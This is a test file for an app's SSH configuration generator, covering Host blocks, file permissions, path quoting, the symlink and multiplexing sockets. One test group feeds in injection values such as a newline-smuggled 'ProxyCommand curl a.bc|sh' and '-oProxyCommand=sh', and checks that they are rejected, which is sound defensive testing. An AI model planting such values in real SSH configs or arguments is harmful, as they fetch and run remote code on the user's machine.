import { describe, expect, it } from "bun:test";
import {
  chmodSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import type { Server } from "@shared/servers";
import { alias } from "@shared/ssh-names";
import {
  appSshPaths,
  controlDir,
  controlPath,
  controlPathFits,
  ensureControlDir,
  ensureLink,
  knownHostsKey,
  readSystemHosts,
  renderSshConfig,
  type SshPaths,
  sshArgs,
  writeSshConfig,
} from "../ssh-config";

function userData(): string {
  return mkdtempSync(join(tmpdir(), "pupitre-userdata-"));
}

/** A home inside the folder under test: nothing lands in the developer's own. */
function pathsIn(dir: string): SshPaths {
  return appSshPaths(dir, join(dir, "home"));
}

const APP_SERVER: Server = {
  host: "203.0.113.10",
  hostFingerprint: undefined,
  id: "srv-a",
  keyPath: "/data/keys/srv-a",
  name: "Staging",
  origin: "app",
  port: 22,
  slug: "staging",
  user: "root",
};

const SYSTEM_SERVER: Server = {
  host: "dev-vps",
  id: "srv-b",
  name: "Poste de travail",
  origin: "system",
  port: 22,
  user: "",
};

describe("le fichier de configuration de l'app", () => {
  it("décrit chaque serveur ajouté par l'app", () => {
    const paths = appSshPaths("/data");

    const config = renderSshConfig([APP_SERVER], paths);

    expect(config).toContain("Host pupitre-srv-a staging");
    expect(config).toContain("  HostName 203.0.113.10");
    expect(config).toContain("  Port 22");
    expect(config).toContain("  User root");
    expect(config).toContain("  IdentityFile /data/keys/srv-a");
    expect(config).toContain("  IdentitiesOnly yes");
    expect(config).toContain(`  UserKnownHostsFile ${paths.knownHostsPath}`);
  });

  it("laisse un hôte du système hors du fichier, puisque l'app n'écrit rien pour lui", () => {
    const config = renderSshConfig(
      [APP_SERVER, SYSTEM_SERVER],
      appSshPaths("/data")
    );

    expect(config).not.toContain("dev-vps");
    expect(config).toContain("pupitre-srv-a");
  });

  it("garde l'identifiant seul quand le nom est celui d'un hôte du système", () => {
    const config = renderSshConfig(
      [APP_SERVER],
      appSshPaths("/data"),
      "darwin",
      null,
      ["staging"]
    );

    expect(config).toContain("Host pupitre-srv-a\n");
    expect(config).not.toContain("staging");
  });

  it("accepte la clé d'hôte au premier contact, l'exige une fois épinglée", () => {
    const paths = appSshPaths("/data");

    const first = renderSshConfig([APP_SERVER], paths);
    const pinned = renderSshConfig(
      [{ ...APP_SERVER, hostFingerprint: "SHA256:abc" }],
      paths
    );

    expect(first).toContain("  StrictHostKeyChecking accept-new");
    expect(pinned).toContain("  StrictHostKeyChecking yes");
    expect(pinned).not.toContain("accept-new");
  });

  it("s'écrit en 0600 dans un dossier 0700, et pose le lien", () => {
    const paths = pathsIn(userData());

    writeSshConfig([APP_SERVER], paths);

    expect(statSync(paths.configPath).mode & 0o777).toBe(0o600);
    expect(statSync(paths.dir).mode & 0o777).toBe(0o700);
    expect(readFileSync(paths.configPath, "utf8")).toContain(
      `  UserKnownHostsFile ${join(paths.link, "ssh", "known_hosts")}`
    );
    expect(lstatSync(paths.link).isSymbolicLink()).toBe(true);
  });
});

describe("une valeur qui ajouterait une directive au fichier", () => {
  const INJECTION = "x\nProxyCommand curl a.bc|sh";

  const OTHER: Server = {
    ...APP_SERVER,
    id: "srv-c",
    keyPath: "/data/keys/srv-c",
    slug: "other",
  };

  it("n'écrit aucun bloc pour le serveur qui la porte, et garde les autres", () => {
    for (const unfit of [
      { ...APP_SERVER, user: INJECTION },
      { ...APP_SERVER, user: "root\tProxyCommand" },
      { ...APP_SERVER, user: "-oProxyCommand=sh" },
      { ...APP_SERVER, host: INJECTION },
      { ...APP_SERVER, host: "203.0.113.10\rProxyCommand" },
      { ...APP_SERVER, host: "-oProxyCommand=sh" },
      { ...APP_SERVER, id: `srv${INJECTION}` },
      { ...APP_SERVER, slug: "staging\nProxyCommand" },
      { ...APP_SERVER, keyPath: `/data/keys/${INJECTION}` },
      { ...APP_SERVER, keyPath: '/data/keys/a" ProxyCommand "b' },
      { ...APP_SERVER, port: Number.NaN },
    ]) {
      const config = renderSshConfig([unfit, OTHER], appSshPaths("/data"));

      expect(config).not.toContain("ProxyCommand");
      expect(config).not.toContain("Host pupitre-srv-a");
      expect(config).toContain("Host pupitre-srv-c other");
    }
  });

  it("n'écrit rien pour un fichier connu dont le chemin porte un retour à la ligne", () => {
    const paths = appSshPaths(`/data/${INJECTION}`);

    expect(renderSshConfig([APP_SERVER], paths)).not.toContain("ProxyCommand");
  });
});

describe("le lien sans espace vers le dossier de l'app", () => {
  it("se pose dans ~/.pupitre, fermé aux autres, et pointe sur le dossier", () => {
    const paths = pathsIn(userData());

    expect(ensureLink(paths)).toBe(paths.link);
    expect(realpathSync(paths.link)).toBe(realpathSync(paths.root));
    expect(statSync(dirname(paths.link)).mode & 0o777).toBe(0o700);
    expect(ensureLink(paths)).toBe(paths.link);
  });

  it("reprend un lien qui pointait sur un dossier parti", () => {
    const paths = pathsIn(userData());
    const gone = join(dirname(paths.root), "gone");

    mkdirSync(dirname(paths.link), { recursive: true });
    symlinkSync(gone, paths.link);

    expect(ensureLink(paths)).toBe(paths.link);
    expect(realpathSync(paths.link)).toBe(realpathSync(paths.root));
  });

  it("laisse en place ce qui n'est pas un lien, et rend alors les chemins réels", () => {
    const paths = pathsIn(userData());

    mkdirSync(paths.link, { recursive: true });
    writeFileSync(join(paths.link, "theirs"), "");

    expect(ensureLink(paths)).toBe(null);
    expect(lstatSync(paths.link).isDirectory()).toBe(true);

    writeSshConfig([APP_SERVER], paths);

    expect(readFileSync(paths.configPath, "utf8")).toContain(
      `  UserKnownHostsFile ${paths.knownHostsPath}`
    );
  });
});

describe("les chemins que chaque système impose", () => {
  it("cite un chemin qui porte un espace, sinon ssh refuse tout le fichier", () => {
    const paths = appSshPaths(
      "/Users/jean/Library/Application Support/Pupitre"
    );

    const config = renderSshConfig(
      [
        {
          ...APP_SERVER,
          keyPath: "/Users/jean/Library/Application Support/Pupitre/keys/srv-a",
        },
      ],
      paths,
      "darwin"
    );

    expect(config).toContain(
      '  IdentityFile "/Users/jean/Library/Application Support/Pupitre/keys/srv-a"'
    );
    expect(config).toContain(`  UserKnownHostsFile "${paths.knownHostsPath}"`);
  });

  it("laisse nu un chemin sans espace", () => {
    const config = renderSshConfig([APP_SERVER], appSshPaths("/data"), "linux");

    expect(config).toContain("  IdentityFile /data/keys/srv-a");
    expect(config).not.toContain('"');
  });

  it("nomme la clé et les hôtes connus à travers le lien quand il tient, puisque Gateway coupe sur l'espace", () => {
    const paths = appSshPaths(
      "/Users/jean/Library/Application Support/Pupitre Dev (app.pupitre.studio)",
      "/Users/jean"
    );

    const config = renderSshConfig(
      [{ ...APP_SERVER, keyPath: join(paths.keysDir, "srv-a") }],
      paths,
      "darwin",
      null,
      [],
      paths.link
    );

    expect(paths.link).toBe(
      "/Users/jean/.pupitre/pupitre-dev-app-pupitre-studio"
    );
    expect(config).toContain(
      "  IdentityFile /Users/jean/.pupitre/pupitre-dev-app-pupitre-studio/keys/srv-a"
    );
    expect(config).toContain(
      "  UserKnownHostsFile /Users/jean/.pupitre/pupitre-dev-app-pupitre-studio/ssh/known_hosts"
    );
    expect(config).not.toContain('"');
  });

  it("garde son chemin à une clé qui vit hors du dossier de l'app", () => {
    const paths = appSshPaths("/data", "/home/jean");

    const config = renderSshConfig(
      [{ ...APP_SERVER, keyPath: "/elsewhere/keys/srv-a" }],
      paths,
      "linux",
      null,
      [],
      paths.link
    );

    expect(config).toContain("  IdentityFile /elsewhere/keys/srv-a");
    expect(config).toContain(
      "  UserKnownHostsFile /home/jean/.pupitre/data/ssh/known_hosts"
    );
  });

  it("n'écrit aucun ControlMaster pour Windows, dont l'OpenSSH l'ignore", () => {
    const windows = renderSshConfig(
      [
        {
          ...APP_SERVER,
          keyPath:
            "C:\\Users\\Jean Dupont\\AppData\\Roaming\\Pupitre\\keys\\srv-a",
        },
      ],
      appSshPaths("C:\\Users\\Jean Dupont\\AppData\\Roaming\\Pupitre"),
      "win32"
    );

    expect(windows).not.toContain("ControlMaster");
    expect(windows).not.toContain("ControlPath");
    expect(windows).not.toContain("ControlPersist");
    expect(windows).toContain("  ServerAliveInterval 30");
    expect(windows).toContain(
      '  IdentityFile "C:\\Users\\Jean Dupont\\AppData\\Roaming\\Pupitre\\keys\\srv-a"'
    );
  });

  it("le garde sur macOS et sur Linux", () => {
    const paths = appSshPaths("/data");

    for (const platform of ["darwin", "linux"] as const) {
      const config = renderSshConfig([APP_SERVER], paths, platform);

      expect(config).toContain("  ControlMaster auto");
      expect(config).toContain("  ControlPersist 10m");
    }
  });
});

describe("le chemin de multiplexage", () => {
  it("tient dans la limite d'un socket Unix, nom temporaire de ssh compris", () => {
    const dir = controlDir(501);

    expect(controlPath(dir)).toBe("/tmp/pupitre-501/%C");
    expect(controlPathFits(dir)).toBe(true);
    expect(controlPathFits(`/private/var/folders/${"x".repeat(60)}`)).toBe(
      false
    );
  });

  it("donne à chaque compte de la machine un dossier qui lui est propre", () => {
    expect(controlDir(501)).not.toBe(controlDir(502));
  });

  it("crée le dossier fermé aux autres, et le referme s'il s'était ouvert", () => {
    const base = mkdtempSync(join(tmpdir(), "pupitre-control-"));
    const dir = controlDir(process.getuid?.() ?? 0, base);

    try {
      expect(ensureControlDir(dir, process.getuid?.() ?? 0)).toBe(true);
      expect(statSync(dir).mode % 0o1000).toBe(0o700);

      chmodSync(dir, 0o755);
      expect(ensureControlDir(dir, process.getuid?.() ?? 0)).toBe(true);
      expect(statSync(dir).mode % 0o1000).toBe(0o700);
    } finally {
      rmSync(base, { force: true, recursive: true });
    }
  });

  it("refuse un lien, un fichier, ou le dossier d'un autre compte", () => {
    const base = mkdtempSync(join(tmpdir(), "pupitre-control-"));
    const uid = process.getuid?.() ?? 0;

    try {
      const linked = join(base, "linked");
      symlinkSync(base, linked);
      expect(ensureControlDir(linked, uid)).toBe(false);

      const file = join(base, "file");
      writeFileSync(file, "");
      expect(ensureControlDir(file, uid)).toBe(false);

      const theirs = join(base, "theirs");
      mkdirSync(theirs);
      expect(ensureControlDir(theirs, uid + 1)).toBe(false);
    } finally {
      rmSync(base, { force: true, recursive: true });
    }
  });

  it("laisse la connexion sans maître quand aucun dossier ne peut être le sien", () => {
    const paths = appSshPaths("/data");
    const config = renderSshConfig([APP_SERVER], paths, "darwin", null);

    expect(config).not.toContain("ControlMaster");
    expect(config).not.toContain("ControlPath");
  });

  it("nomme le socket par ce que ssh sait du serveur et du compte", () => {
    const paths = appSshPaths("/data");
    const config = renderSshConfig(
      [APP_SERVER],
      paths,
      "darwin",
      "/tmp/pupitre-501"
    );

    expect(config).toContain("  ControlPath /tmp/pupitre-501/%C");
  });
});

describe("les arguments d'un appel ssh", () => {
  it("passe le fichier de l'app pour un serveur de l'app", () => {
    const paths = appSshPaths("/data");

    expect(sshArgs(APP_SERVER, paths)).toEqual([
      "-F",
      paths.configPath,
      "pupitre-srv-a",
    ]);
  });

  it("laisse un hôte du système à la configuration du système", () => {
    expect(sshArgs(SYSTEM_SERVER, appSshPaths("/data"))).toEqual(["dev-vps"]);
  });

  it("nomme un serveur de l'app par son identifiant, jamais par son adresse", () => {
    expect(alias(APP_SERVER)).toBe("pupitre-srv-a");
    expect(alias(SYSTEM_SERVER)).toBe("dev-vps");
  });
});

describe("la clé de known_hosts", () => {
  it("est l'hôte seul sur le port par défaut, entre crochets ailleurs", () => {
    expect(knownHostsKey(APP_SERVER)).toBe("203.0.113.10");
    expect(knownHostsKey({ ...APP_SERVER, port: 2222 })).toBe(
      "[203.0.113.10]:2222"
    );
  });
});

describe("les hôtes déclarés par le système", () => {
  it("lit les blocs Host et écarte les motifs", () => {
    const home = mkdtempSync(join(tmpdir(), "pupitre-home-"));
    const file = join(home, "config");
    writeFileSync(
      file,
      "Host *\nHost dev-vps prod\n  User dev\nHost bastion\n",
      "utf8"
    );

    const hosts = readSystemHosts(file);

    expect(hosts).toEqual(["dev-vps", "prod", "bastion"]);
  });

  it("renvoie une liste vide quand le fichier n'existe pas", () => {
    expect(readSystemHosts("/nowhere/ssh/config")).toEqual([]);
  });
});
